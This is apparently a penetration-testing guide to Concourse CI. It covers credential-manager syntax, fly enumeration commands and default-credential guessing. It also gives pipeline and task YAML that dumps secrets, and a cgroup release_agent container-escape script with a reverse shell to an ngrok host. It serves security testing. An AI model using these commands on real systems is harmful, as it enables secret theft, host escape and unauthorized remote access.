# Concourse Enumeration & Attacks



## Vars & Credential Manager

In the YAML configs you can configure values using the syntax `((`_`source-name`_`:`_`secret-path`_`.`_`secret-field`_`))`.\
The **source-name is optional**, and if omitted, the [cluster-wide credential manager](https://concourse-ci.org/vars.html#cluster-wide-credential-manager) will be used, or the value may be provided [statically](https://concourse-ci.org/vars.html#static-vars).\
The **optional **_**secret-field**_ specifies a field on the fetched secret to read. If omitted, the credential manager may choose to read a 'default field' from the fetched credential if the field exists.\
Moreover, the _**secret-path**_ and _**secret-field**_ may be surrounded by double quotes `"..."` if they **contain special characters** like `.` and `:`. For instance, `((source:"my.secret"."field:1"))` will set the _secret-path_ to `my.secret` and the _secret-field_ to `field:1`.

### Static Vars

Static vars can be specified in **tasks steps**:

```yaml
  - task: unit-1.13
    file: booklit/ci/unit.yml
    vars: {tag: 1.13}
```

Or using the following `fly` **arguments**:

* `-v` or `--var` `NAME=VALUE` sets the string `VALUE` as the value for the var `NAME`.
* `-y` or `--yaml-var` `NAME=VALUE` parses `VALUE` as YAML and sets it as the value for the var `NAME`.
* `-i` or `--instance-var` `NAME=VALUE` parses `VALUE` as YAML and sets it as the value for the instance var `NAME`. See [Grouping Pipelines](https://concourse-ci.org/instanced-pipelines.html) to learn more about instance vars.
* `-l` or `--load-vars-from` `FILE` loads `FILE`, a YAML document containing mapping var names to values, and sets them all.

### Credential Management

There are different ways a **Credential Manager can be specified** in a pipeline, read how in [https://concourse-ci.org/creds.html](https://concourse-ci.org/creds.html).\
Moreover, Concourse supports different credential managers:

* [The Vault credential manager](https://concourse-ci.org/vault-credential-manager.html)
* [The CredHub credential manager](https://concourse-ci.org/credhub-credential-manager.html)
* [The AWS SSM credential manager](https://concourse-ci.org/aws-ssm-credential-manager.html)
* [The AWS Secrets Manager credential manager](https://concourse-ci.org/aws-asm-credential-manager.html)
* [Kubernetes Credential Manager](https://concourse-ci.org/kubernetes-credential-manager.html)
* [The Conjur credential manager](https://concourse-ci.org/conjur-credential-manager.html)
* [Caching credentials](https://concourse-ci.org/creds-caching.html)
* [Redacting credentials](https://concourse-ci.org/creds-redacting.html)
* [Retrying failed fetches](https://concourse-ci.org/creds-retry-logic.html)

{% hint style="danger" %}
Note that if you have some kind of **write access to Concourse** you can create jobs to **exfiltrate those secrets** as Concourse needs to be able to access them.
{% endhint %}

## Concourse Enumeration

In order to enumerate a concourse environment you first need to **gather valid credentials** or to find an **authenticated token** probably in a `.flyrc` config file.

### Login and Current User enum

* To login you need to know the **endpoint**, the **team name** (default is `main`) and a **team the user belongs to**:
  * `fly --target example login --team-name my-team --concourse-url https://ci.example.com [--insecure] [--client-cert=./path --client-key=./path]`
* Get configured **targets**:
  * `fly targets`
* Get if the configured **target connection** is still **valid**:
  * `fly -t <target> status`
* Get **role** of the user against the indicated target:
  * `fly -t <target> userinfo`

### Teams & Users

* Get a list of the Teams
  * `fly -t <target> teams`
* Get roles inside team
  * `fly -t <target> get-team -n <team-name>`
* Get a list of users
  * `fly -t <target> active-users`

### Pipelines

* **List** pipelines:
  * `fly -t <target> pipelines -a`
* **Get** pipeline yaml (**sensitive information** might be found in the definition):
  * `fly -t <target> get-pipeline -p <pipeline-name>`
* Get all pipeline **config declared vars**
  * `for pipename in $(fly -t <target> pipelines | grep -Ev "^id" | awk '{print $2}'); do echo $pipename; fly -t <target> get-pipeline -p $pipename -j | grep -Eo '"vars":[^}]+'; done`
* Get all the **pipelines secret names used** (if you can create/modify a job or hijack a container you could exfiltrate them):

```bash
rm /tmp/secrets.txt;
for pipename in $(fly -t onelogin pipelines | grep -Ev "^id" | awk '{print $2}'); do 
    echo $pipename;
    fly -t onelogin get-pipeline -p $pipename | grep -Eo '\(\(.*\)\)' | sort | uniq | tee -a /tmp/secrets.txt;
    echo "";
done
echo ""
echo "ALL SECRETS"
cat /tmp/secrets.txt | sort | uniq
rm /tmp/secrets.txt
```

### Containers & Workers

* List **workers**:
  * `fly -t <target> workers`
* List **containers**:
  * `fly -t <target> containers`

## Concourse Attacks

### Credentials Brute-Force

* admin:admin
* test:test

### Session inside running or recently run container

If you have enough privileges (**member role or more**) you will be able to **list pipelines and roles** and just get a **session inside** the `<pipeline>/<job>` **container** using:

```bash
fly -t tutorial intercept --job pipeline-name/job-name
fly -t tutorial intercept # To be presented a prompt with all the options
```

With these permissions you might be able to:

* **Steal the secrets** inside the **container**
* Try to **escape** to the node
* Enumerate/Abuse **cloud metadata** endpoint (from the pod and from the node, if possible)

### Pipeline Creation/Modification

If you have enough privileges (**member role or more**) you will be able to **create/modify new pipelines.** Check this example:

```yaml
jobs:
- name: simple
  plan:
  - task: simple-task
    privileged: true
    config:
      # Tells Concourse which type of worker this task should run on
      platform: linux
      image_resource:
        type: registry-image
        source:
          repository: busybox # images are pulled from docker hub by default
      run:
        path: sh
        args:
        - -cx
        - |
          echo "$SUPER_SECRET"
          sleep 1000
      params:
        SUPER_SECRET: ((super.secret))
```

With the **modification/creation** of a new pipeline you will be able to:

* **Steal** the **secrets** (via echoing them out or getting inside the container and running `env`)
* **Escape** to the **node** (by giving you enough privileges - `privileged: true`)
* Enumerate/Abuse **cloud metadata** endpoint (from the pod and from the node)
* **Delete** created pipeline

### Execute Custom Task

This is similar to the previous method but instead of modifying/creating a whole new pipeline you can **just execute a custom task** (which will probably be much more **stealthier**):

```yaml
# For more task_config options check https://concourse-ci.org/tasks.html
platform: linux
image_resource:
  type: registry-image
  source:
    repository: ubuntu
run:
  path: sh
  args:
  - -cx
  - |
    env
    sleep 1000
params:
  SUPER_SECRET: ((super.secret))
```

```bash
fly -t tutorial execute --privileged --config task_config.yml
```

### Escaping to the node

In the previous sections we saw how to **execute a privileged task with concourse**. This won't give the container exactly the same access as the privileged flag in a docker container. For example, you won't see the node filesystem device in /dev, so the escape could be more "complex".

In the following PoC we are going to use the release\_agent to escape with some small modifications:

```bash
# Mounts the RDMA cgroup controller and create a child cgroup
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the memory cgroup controller, try change memory to rdma to fix it
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release


# CHANGE ME
# The host path will look like the following, but you need to change it:
host_path="/mnt/vda1/hostpath-provisioner/default/concourse-work-dir-concourse-release-worker-0/overlays/ae7df0ca-0b38-4c45-73e2-a9388dcb2028/rootfs"

## The initial path "/mnt/vda1" is probably the same, but you can check it using the mount command:
#/dev/vda1 on /scratch type ext4 (rw,relatime)
#/dev/vda1 on /tmp/build/e55deab7 type ext4 (rw,relatime)
#/dev/vda1 on /etc/hosts type ext4 (rw,relatime)
#/dev/vda1 on /etc/resolv.conf type ext4 (rw,relatime)

## Then next part I think is constant "hostpath-provisioner/default/"

## For the next part "concourse-work-dir-concourse-release-worker-0" you need to know how it's constructed
# "concourse-work-dir" is constant
# "concourse-release" is the consourse prefix of the current concourse env (you need to find it from the API)
# "worker-0" is the name of the worker the container is running in (will be usually that one or incrementing the number)

## The final part "overlays/bbedb419-c4b2-40c9-67db-41977298d4b3/rootfs" is kind of constant
# running `mount | grep "on / " | grep -Eo "workdir=([^,]+)"` you will see something like:
# workdir=/concourse-work-dir/overlays/work/ae7df0ca-0b38-4c45-73e2-a9388dcb2028
# the UID is the part we are looking for

# Then the host_path is:
#host_path="/mnt/<device>/hostpath-provisioner/default/concourse-work-dir-<concourse_prefix>-worker-<num>/overlays/<UID>/rootfs"

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent


#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```

{% hint style="warning" %}
As you might have noticed this is just a [**regular release\_agent escape**](../../linux-unix/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation.md#privileged) just modifying the path of the cmd in the node
{% endhint %}
